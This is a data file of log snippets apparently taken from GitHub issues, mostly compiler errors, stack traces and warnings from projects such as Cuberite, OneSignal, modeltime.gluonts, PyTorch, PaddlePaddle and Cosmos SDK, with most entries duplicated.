nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:849:80: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<int>* self = (const Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                               ^\r\n                                                                               nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:881:80: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<int>* self = (const Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                               ^\r\n                                                                               nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:914:80: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<int>* self = (const Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                               ^\r\n                                                                               nullptr\r\nfatal error: too many errors emitted, stopping now [-ferror-limit=]\r\n20 errors generated.\r\nmake[2]: *** [src/Bindings/CMakeFiles/Bindings.dir/Bindings.cpp.o] Error 1\r\nmake[1]: *** [src/Bindings/CMakeFiles/Bindings.dir/all] Error 2\r\nmake: *** [all] Error 2\r\n"
    },
    {
        "logs": "`\r\nCaused by java.lang.VerifyError: com/onesignal/LocationGMS\r\n       at com.onesignal.OneSignal.onAppLostFocus(OneSignal.java:1062)\r\n       at com.onesignal.ActivityLifecycleHandler$AppFocusRunnable.run(ActivityLifecycleHandler.java:171)\r\n       at android.os.Handler.handleCallback(Handler.java:733)\r\n       at android.os.Handler.dispatchMessage(Handler.java:95)\r\n       at android.os.Looper.loop(Looper.java:136)\r\n       at android.os.HandlerThread.run(HandlerThread.java:61)\r\n"
    },
    {
        "logs": "```\r\nCaused by java.lang.VerifyError: com/onesignal/LocationGMS\r\n       at com.onesignal.OneSignal.onAppLostFocus(OneSignal.java:1062)\r\n       at com.onesignal.ActivityLifecycleHandler$AppFocusRunnable.run(ActivityLifecycleHandler.java:171)\r\n       at android.os.Handler.handleCallback(Handler.java:733)\r\n       at android.os.Handler.dispatchMessage(Handler.java:95)\r\n       at android.os.Looper.loop(Looper.java:136)\r\n       at android.os.HandlerThread.run(HandlerThread.java:61)\r\n"
    },
    {
        "logs": "`\r\n{\r\n  \"packageId\": \"com.aesthyrica.lafon\",\r\n  \"action\": \"notworking\",\r\n  \"userInfo\": {\r\n    \"arch32\": false,\r\n    \"packageId\": \"com.aesthyrica.lafon\",\r\n    \"deviceId\": \"iPhone10,3\",\r\n    \"url\": \"http://cydia.saurik.com/package/com.aesthyrica.lafon/\",\r\n    \"iOSVersion\": \"12.1.1\",\r\n    \"packageVersionIndexed\": false,\r\n    \"packageName\": \"Lafon\",\r\n    \"category\": \"Tweaks\",\r\n    \"repository\": \"Packix\",\r\n    \"name\": \"Lafon\",\r\n    \"installed\": \"1.0\",\r\n    \"packageIndexed\": false,\r\n    \"packageStatusExplaination\": \"This tweak has not been reviewed. Please submit a review if you choose to install.\",\r\n    \"id\": \"com.aesthyrica.lafon\",\r\n    \"commercial\": false,\r\n    \"packageInstalled\": true,\r\n    \"tweakCompatVersion\": \"0.1.5\",\r\n    \"shortDescription\": \"Change the Lockscreen fonts.\",\r\n    \"latest\": \"1.0\",\r\n    \"author\": \"Aesthyrica\",\r\n    \"packageStatus\": \"Unknown\"\r\n  },\r\n  \"base64\": \"eyJhcmNoMzIiOmZhbHNlLCJwYWNrYWdlSWQiOiJjb20uYWVzdGh5cmljYS5sYWZvbiIsImRldmljZUlkIjoiaVBob25lMTAsMyIsInVybCI6Imh0dHA6XC9cL2N5ZGlhLnNhdXJpay5jb21cL3BhY2thZ2VcL2NvbS5hZXN0aHlyaWNhLmxhZm9uXC8iLCJpT1NWZXJzaW9uIjoiMTIuMS4xIiwicGFja2FnZVZlcnNpb25JbmRleGVkIjpmYWxzZSwicGFja2FnZU5hbWUiOiJMYWZvbiIsImNhdGVnb3J5IjoiVHdlYWtzIiwicmVwb3NpdG9yeSI6IlBhY2tpeCIsIm5hbWUiOiJMYWZvbiIsImluc3RhbGxlZCI6IjEuMCIsInBhY2thZ2VJbmRleGVkIjpmYWxzZSwicGFja2FnZVN0YXR1c0V4cGxhaW5hdGlvbiI6IlRoaXMgdHdlYWsgaGFzIG5vdCBiZWVuIHJldmlld2VkLiBQbGVhc2Ugc3VibWl0IGEgcmV2aWV3IGlmIHlvdSBjaG9vc2UgdG8gaW5zdGFsbC4iLCJpZCI6ImNvbS5hZXN0aHlyaWNhLmxhZm9uIiwiY29tbWVyY2lhbCI6ZmFsc2UsInBhY2thZ2VJbnN0YWxsZWQiOnRydWUsInR3ZWFrQ29tcGF0VmVyc2lvbiI6IjAuMS41Iiwic2hvcnREZXNjcmlwdGlvbiI6IkNoYW5nZSB0aGUgTG9ja3NjcmVlbiBmb250cy4iLCJsYXRlc3QiOiIxLjAiLCJhdXRob3IiOiJBZXN0aHlyaWNhIiwicGFja2FnZVN0YXR1cyI6IlVua25vd24ifQ==\",\r\n  \"chosenStatus\": \"notworking\",\r\n  \"notes\": \"Add support for jellyfish tweak\"\r\n}\r\n"
    },
    {
        "logs": "```\r\n{\r\n  \"packageId\": \"com.aesthyrica.lafon\",\r\n  \"action\": \"notworking\",\r\n  \"userInfo\": {\r\n    \"arch32\": false,\r\n    \"packageId\": \"com.aesthyrica.lafon\",\r\n    \"deviceId\": \"iPhone10,3\",\r\n    \"url\": \"http://cydia.saurik.com/package/com.aesthyrica.lafon/\",\r\n    \"iOSVersion\": \"12.1.1\",\r\n    \"packageVersionIndexed\": false,\r\n    \"packageName\": \"Lafon\",\r\n    \"category\": \"Tweaks\",\r\n    \"repository\": \"Packix\",\r\n    \"name\": \"Lafon\",\r\n    \"installed\": \"1.0\",\r\n    \"packageIndexed\": false,\r\n    \"packageStatusExplaination\": \"This tweak has not been reviewed. Please submit a review if you choose to install.\",\r\n    \"id\": \"com.aesthyrica.lafon\",\r\n    \"commercial\": false,\r\n    \"packageInstalled\": true,\r\n    \"tweakCompatVersion\": \"0.1.5\",\r\n    \"shortDescription\": \"Change the Lockscreen fonts.\",\r\n    \"latest\": \"1.0\",\r\n    \"author\": \"Aesthyrica\",\r\n    \"packageStatus\": \"Unknown\"\r\n  },\r\n  \"base64\": \"eyJhcmNoMzIiOmZhbHNlLCJwYWNrYWdlSWQiOiJjb20uYWVzdGh5cmljYS5sYWZvbiIsImRldmljZUlkIjoiaVBob25lMTAsMyIsInVybCI6Imh0dHA6XC9cL2N5ZGlhLnNhdXJpay5jb21cL3BhY2thZ2VcL2NvbS5hZXN0aHlyaWNhLmxhZm9uXC8iLCJpT1NWZXJzaW9uIjoiMTIuMS4xIiwicGFja2FnZVZlcnNpb25JbmRleGVkIjpmYWxzZSwicGFja2FnZU5hbWUiOiJMYWZvbiIsImNhdGVnb3J5IjoiVHdlYWtzIiwicmVwb3NpdG9yeSI6IlBhY2tpeCIsIm5hbWUiOiJMYWZvbiIsImluc3RhbGxlZCI6IjEuMCIsInBhY2thZ2VJbmRleGVkIjpmYWxzZSwicGFja2FnZVN0YXR1c0V4cGxhaW5hdGlvbiI6IlRoaXMgdHdlYWsgaGFzIG5vdCBiZWVuIHJldmlld2VkLiBQbGVhc2Ugc3VibWl0IGEgcmV2aWV3IGlmIHlvdSBjaG9vc2UgdG8gaW5zdGFsbC4iLCJpZCI6ImNvbS5hZXN0aHlyaWNhLmxhZm9uIiwiY29tbWVyY2lhbCI6ZmFsc2UsInBhY2thZ2VJbnN0YWxsZWQiOnRydWUsInR3ZWFrQ29tcGF0VmVyc2lvbiI6IjAuMS41Iiwic2hvcnREZXNjcmlwdGlvbiI6IkNoYW5nZSB0aGUgTG9ja3NjcmVlbiBmb250cy4iLCJsYXRlc3QiOiIxLjAiLCJhdXRob3IiOiJBZXN0aHlyaWNhIiwicGFja2FnZVN0YXR1cyI6IlVua25vd24ifQ==\",\r\n  \"chosenStatus\": \"notworking\",\r\n  \"notes\": \"Add support for jellyfish tweak\"\r\n}\r\n"
    },
    {
        "logs": "`\n<issue_comment>username_1: I do not understand flow of your code\r\nWhere do I place sample component and style?\n<issue_comment>username_0: <Provider store={store}>\r\n    <PersistGate loading={<StoreLoading/>} persistor={persistor}>\r\n      <StyleProvider style={global.conf.theme}> <!-- This is getTheme(platform) -->\r\n        <Root>\r\n          <React.Fragment>\r\n            <LoadingOverlay/>\r\n              <Container>\r\n                <Content padder>\r\n                  <Text>Hello</Text>\r\n                </Content>\r\n            </Container\r\n          </React.Fragment>\r\n        </Root>\r\n      </StyleProvider>\r\n    </PersistGate>\r\n  </Provider>\r\n</ImageBackground>\r\n"
    },
    {
        "logs": "` r\r\nlibrary(modeltime.gluonts)\r\n#> Loading required package: modeltime\r\nlibrary(tidymodels)\r\n#> \u2500\u2500 Attaching packages \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 tidymodels 0.1.2 \u2500\u2500\r\n#> \u2713 broom     0.7.2      \u2713 recipes   0.1.15\r\n#> \u2713 dials     0.0.9      \u2713 rsample   0.0.8 \r\n#> \u2713 dplyr     1.0.2      \u2713 tibble    3.0.4 \r\n#> \u2713 ggplot2   3.3.2      \u2713 tidyr     1.1.2 \r\n#> \u2713 infer     0.5.3      \u2713 tune      0.1.2 \r\n#> \u2713 modeldata 0.1.0      \u2713 workflows 0.2.1 \r\n#> \u2713 parsnip   0.1.4      \u2713 yardstick 0.0.7 \r\n#> \u2713 purrr     0.3.4\r\n#> \u2500\u2500 Conflicts \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 tidymodels_conflicts() \u2500\u2500\r\n#> x purrr::discard() masks scales::discard()\r\n#> x dplyr::filter()  masks stats::filter()\r\n#> x dplyr::lag()     masks stats::lag()\r\n#> x recipes::step()  masks stats::step()\r\nlibrary(tidyverse)\r\n\r\n# Fit a GluonTS DeepAR Model\r\nmodel_fit_deepar <- deep_ar(\r\n    id                    = \"id\",\r\n    freq                  = \"M\",\r\n    prediction_length     = 24,\r\n    lookback_length       = 36,\r\n    epochs                = 10, \r\n    num_batches_per_epoch = 50,\r\n    learn_rate            = 0.001,\r\n    num_layers            = 2,\r\n    dropout               = 0.10\r\n) %>%\r\n    set_engine(\"gluonts_deepar\") %>%\r\n    fit(value ~ ., training(m750_splits))\r\n#> Error in rlang::env_get(get_model_env(), paste0(cls, \"_modes\")): argument \"default\" is missing, with no default\r\n"
    },
    {
        "logs": "` r\r\nremotes::install_github(\"tidymodels/parsnip\")\r\n#> Skipping install of 'parsnip' from a github remote, the SHA1 (a82ed405) has not changed since last install.\r\n#>   Use "
    },
    {
        "logs": "` to force installation\r\nremotes::install_github(\"business-science/modeltime.gluonts\")\r\n#> Skipping install of 'modeltime.gluonts' from a github remote, the SHA1 (86df28d1) has not changed since last install.\r\n#>   Use "
    },
    {
        "logs": "` to force installation\r\n\r\nSys.setenv(GLUONTS_PYTHON = \"/home/jasonusername_0w0/.local/share/r-miniconda/envs/r-gluonts/bin/python\")\r\n\r\nlibrary(modeltime.gluonts)\r\n#> Loading required package: modeltime\r\nlibrary(tidymodels)\r\n#> \u2500\u2500 Attaching packages \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 tidymodels 0.1.2 \u2500\u2500\r\n#> \u2713 broom     0.7.2          \u2713 recipes   0.1.15    \r\n#> \u2713 dials     0.0.9          \u2713 rsample   0.0.8     \r\n#> \u2713 dplyr     1.0.2          \u2713 tibble    3.0.4     \r\n#> \u2713 ggplot2   3.3.2          \u2713 tidyr     1.1.2     \r\n#> \u2713 infer     0.5.3          \u2713 tune      0.1.2     \r\n#> \u2713 modeldata 0.1.0          \u2713 workflows 0.2.1     \r\n#> \u2713 parsnip   0.1.4.9000     \u2713 yardstick 0.0.7     \r\n#> \u2713 purrr     0.3.4\r\n#> \u2500\u2500 Conflicts \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 tidymodels_conflicts() \u2500\u2500\r\n#> x purrr::discard() masks scales::discard()\r\n#> x dplyr::filter()  masks stats::filter()\r\n#> x dplyr::lag()     masks stats::lag()\r\n#> x recipes::step()  masks stats::step()\r\nlibrary(tidyverse)\r\n\r\n# Fit a GluonTS DeepAR Model\r\nmodel_fit_deepar <- deep_ar(\r\n    id                    = \"id\",\r\n    freq                  = \"M\",\r\n    prediction_length     = 24,\r\n    lookback_length       = 36,\r\n    epochs                = 10, \r\n    num_batches_per_epoch = 50,\r\n    learn_rate            = 0.001,\r\n    num_layers            = 2,\r\n    dropout               = 0.10\r\n) %>%\r\n    set_engine(\"gluonts_deepar\") %>%\r\n    fit(value ~ ., training(m750_splits))\r\n#> Error in rlang::env_get(get_model_env(), paste0(cls, \"_modes\")): argument \"default\" is missing, with no default\r\n"
    },
    {
        "logs": "`\r\nError in rlang::env_get(get_model_env(), paste0(cls, \"_modes\")) : argument \"default\" is missing, with no default\r\n6. rlang::env_get(get_model_env(), paste0(cls, \"_modes\"))\r\n5. parsnip::new_model_spec(\"deep_ar\", args = args, eng_args = NULL, mode = mode, method = NULL, engine = NULL)\r\n4. deep_ar(id = \"id\", freq = \"M\", prediction_length = 24, lookback_length = 36, epochs = 10, num_batches_per_epoch = 50, learn_rate = 0.001, num_layers = 2, dropout = 0.1)\r\n3. set_engine(., \"gluonts_deepar\")\r\n2. fit(., value ~ ., training(m750_splits))\r\n1. deep_ar(id = \"id\", freq = \"M\", prediction_length = 24, lookback_length = 36, epochs = 10, num_batches_per_epoch = 50, learn_rate = 0.001, num_layers = 2, dropout = 0.1) %>% set_engine(\"gluonts_deepar\") %>% fit(value ~ ., training(m750_splits))\r\n"
    },
    {
        "logs": "`sh\r\n/telescope/src/api/planet/src/index.js:9\r\n    app.engine('handlebars', expressHandlebars());\r\n                             ^\r\n\r\nTypeError: expressHandlebars is not a function\r\n"
    },
    {
        "logs": "```sh\r\n/telescope/src/api/planet/src/index.js:9\r\n    app.engine('handlebars', expressHandlebars());\r\n                             ^\r\n\r\nTypeError: expressHandlebars is not a function\r\n"
    },
    {
        "logs": "`\r\n@Test\r\npublic void test_JodaDSTBug() throws Exception {\r\n  DateTime problemDate = DateTime.parse(\"1916-04-01T23:59:59.999\").withZone(DateTimeZone.forID(\"Europe/Berlin\"));\r\n  DateTime endTime = problemDate.dayOfMonth().withMaximumValue();\r\n  Assert.assertEquals(\"1916-04-30T22:59:59.999+01:00\", endTime.toString());\r\n}\r\n"
    },
    {
        "logs": "```\r\n@Test\r\npublic void test_JodaDSTBug() throws Exception {\r\n  DateTime problemDate = DateTime.parse(\"1916-04-01T23:59:59.999\").withZone(DateTimeZone.forID(\"Europe/Berlin\"));\r\n  DateTime endTime = problemDate.dayOfMonth().withMaximumValue();\r\n  Assert.assertEquals(\"1916-04-30T22:59:59.999+01:00\", endTime.toString());\r\n}\r\n"
    },
    {
        "logs": "`\r\n{{- if eq . \"servingcontainer\"}}registry.build03.ci.openshift.org/ci-op-ppk05l2k/pipeline@sha256:ac1aa5d3aa814939fd0a124a3c9c24daa95e8b4d9fd75951066c5aca84b880f1{{end -}}\r\n{{- if eq . \"sidecarcontainer\"}}registry.build03.ci.openshift.org/ci-op-ppk05l2k/pipeline@sha256:eafead00d184a9ea2a7d70f94522b0225dfd3526f2c23901bf7bba897f2dfdf8{{end -}}\r\n{{- if eq . \"hellohttp2\"}}registry.build03.ci.openshift.org/ci-op-ppk05l2k/pipeline@sha256:43c4175dd3086f80a7eb9f727867e33e53e38b3f630a8d2d497fb97806076720{{end -}}\r\n{{- if eq . \"hellovolume\"}}registry.build03.ci.openshift.org/ci-op-ppk05l2k/pipeline@sha256:7b21fec64afdd726af89a9c390ef28da1f53d6d7cb45809f6f462044820c0bc2{{end -}}\r\n{{- if eq . \"invalidhelloworld\"}}quay.io/openshift-knative/helloworld:invalid{{end -}}\r\n{{end -}}' --enable-alpha --https --skip-cleanup-on-fail --resolvabledomain\r\nPASS test/e2e/pvc.TestPersistentVolumeClaims (23.45s)\r\nPASS test/e2e/pvc\r\n"
    },
    {
        "logs": "`\r\n                    var config = new MapperConfiguration(cfg =>\r\n                    {\r\n                        cfg.AddCollectionMappers();\r\n                        cfg.CreateMap<Project, Project>().EqualityComparison((s, d) => s.ID == d.ID);\r\n                        cfg.CreateMap<SomeNestedObject, SomeNestedObject>().EqualityComparison((s, d) => s.ID == d.ID);\r\n                        cfg.CreateMap<SomeOtherNestedObject, SomeOtherNestedObject>().EqualityComparison((s, d) => s.ID == d.ID);\r\n                    });\r\n\r\nexistingProject = config.CreateMapper().Map(changedProject, existingProject);\r\n"
    },
    {
        "logs": "```\r\n                    var config = new MapperConfiguration(cfg =>\r\n                    {\r\n                        cfg.AddCollectionMappers();\r\n                        cfg.CreateMap<Project, Project>().EqualityComparison((s, d) => s.ID == d.ID);\r\n                        cfg.CreateMap<SomeNestedObject, SomeNestedObject>().EqualityComparison((s, d) => s.ID == d.ID);\r\n                        cfg.CreateMap<SomeOtherNestedObject, SomeOtherNestedObject>().EqualityComparison((s, d) => s.ID == d.ID);\r\n                    });\r\n\r\nexistingProject = config.CreateMapper().Map(changedProject, existingProject);\r\n"
    },
    {
        "logs": "`warning: Vertical Whitespace Violation: Limit vertical whitespace to a single empty line. Currently 4. (vertical_whitespace)"
    },
    {
        "logs": "`js\r\nimport statuses from 'statuses'\r\n\r\n// Add a hypothetical \"invalid chicken\" response code\r\nstatuses[440] = 'Invalid chicken'\r\nstatuses.codes.push(440)\r\nstatuses['Invalid chicken'] = 440\r\n"
    },
    {
        "logs": "`js\r\nconst statuses = require('statuses')\r\n\r\nstatuses.mergeStatusesMap({\r\n  440: 'invalid chicken'\r\n})\r\n\r\napp.statuses = statuses\r\n"
    },
    {
        "logs": "`../aten/src/ATen/native/BinaryOps.cpp:81: UserWarning: Integer division of tensors using div or / is deprecated, and in a future release div will perform true division as in Python 3. Use true_divide or floor_divide (// in Python) instead."
    },
    {
        "logs": "`\r\ntest/test_torch.py:16463: UserWarning: Integer division of tensors using div or / is deprecated, and in a future release div will perform true division as in Python 3. Use true_divide or floor_divide (// in Python) instead. (Triggered internally at  ../aten/src/ATen/native/BinaryOps.cpp:81.)\r\n  cpu_result = getattr(cpu_tensor, op_str)(*cpu_args)\r\n"
    },
    {
        "logs": "`\r\nTraceback (most recent call last):\r\n  File \"../../warnings.py\", line 44, in <module>\r\n    fn()\r\n  File \"../../warnings.py\", line 14, in fn\r\n    return a / b\r\nUserWarning: Integer division of tensors using div or / is deprecated, and in a future release div will perform true division as in Python 3. Use true_divide or floor_divide (// in Python) instead.\r\n"
    },
    {
        "logs": "`\r\n../../warnings.py:13: UserWarning: The number of elements in the out tensor of shape [5] is 5 which does not match the computed number of elements 3. Note that this may occur as a result of rounding error. The out tensor will be resized to a tensor of shape (3,). (Triggered internally at  ../aten/src/ATen/native/RangeFactories.cpp:215.)\r\n  torch.arange(0, 3, out=out)\r\n"
    },
    {
        "logs": "`\r\n../../warnings.py:17: UserWarning: The number of elements in the out tensor of shape [5] is 5 which does not match the computed number of elements 3. Note that this may occur as a result of rounding error. The out tensor will be resized to a tensor of shape (3,). (Triggered internally at  ../aten/src/ATen/native/RangeFactories.cpp:215.)\r\n  scripted_fn()  # this warning is generated from interpreter.cpp\r\n"
    },
    {
        "logs": "`\r\n    data = self._reader.read_next()\r\nValueError: (InvalidArgument) The sample number of reader's input data and the input number of feed list are not equal.\r\nPossible reasons are:\r\n  The generator is decorated by "
    },
    {
        "logs": "```\r\n    data = self._reader.read_next()\r\nValueError: (InvalidArgument) The sample number of reader's input data and the input number of feed list are not equal.\r\nPossible reasons are:\r\n  The generator is decorated by `paddle.batch` and configured by `set_batch_generator`, but here need to used `set_sample_list_generator`.\r\n  [Hint: Expected names_.size() == ret_[i].size(), but received names_.size():4 != ret_[i].size():3.] (at C:\\home\\workspace\\Paddle_release2\\paddle\\fluid\\pybind\\reader_py.cc:199)\r\n"
    },
    {
        "logs": "`shell\r\n--- FAIL: BenchmarkOneBankSendTxPerBlock\r\n    bench_test.go:56: \r\n        \tError Trace:\tbench_test.go:56\r\n        \tError:      \tReceived unexpected error:\r\n        \t            \t\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.SigVerificationDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/sigverify.go:275\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.SigGasConsumeDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/sigverify.go:190\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.ValidateSigCountDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/sigverify.go:388\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.SetPubKeyDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/sigverify.go:126\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.DeductFeeDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/fee.go:125\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.ConsumeTxSizeGasDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/basic.go:143\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.ValidateMemoDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/basic.go:67\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.TxTimeoutHeightDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/basic.go:206\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.ValidateBasicDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/basic.go:35\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.MempoolFeeDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/fee.go:54\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.RejectExtensionOptionsDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/ext.go:35\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/middleware.legacyAnteTxHandler.runAnte\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/middleware/legacy_ante.go:81\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/middleware.legacyAnteTxHandler.DeliverTx\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/middleware/legacy_ante.go:41\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/middleware.indexEventsTxHandler.DeliverTx\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/middleware/index_events.go:45\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/middleware.recoveryTxHandler.DeliverTx\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/middleware/recovery.go:74\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/middleware.gasTxHandler.DeliverTx\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/middleware/gas.go:53\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/baseapp.(*BaseApp).SimDeliver\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/baseapp/test_helpers.go:58\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/bank_test.BenchmarkOneBankSendTxPerBlock\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/bank/bench_test.go:55\r\n[Truncated]\n<!-- git commit hash or release version -->\r\n\r\n## Steps to Reproduce\r\n"
    },
    {
        "logs": "```shell\r\n--- FAIL: BenchmarkOneBankSendTxPerBlock\r\n    bench_test.go:56: \r\n        \tError Trace:\tbench_test.go:56\r\n        \tError:      \tReceived unexpected error:\r\n        \t            \t\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.SigVerificationDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/sigverify.go:275\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.SigGasConsumeDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/sigverify.go:190\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.ValidateSigCountDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/sigverify.go:388\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.SetPubKeyDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/sigverify.go:126\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.DeductFeeDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/fee.go:125\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/types.ChainAnteDecorators.func1\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/types/handler.go:40\r\n        \t            \tgithub.com/cosmos/cosmos-sdk/x/auth/ante.ConsumeTxSizeGasDecorator.AnteHandle\r\n        \t            \t\t/home/cuong/go/src/github.com/cosmos/cosmos-sdk/x/auth/ante/basic.go:143\r\n        \t            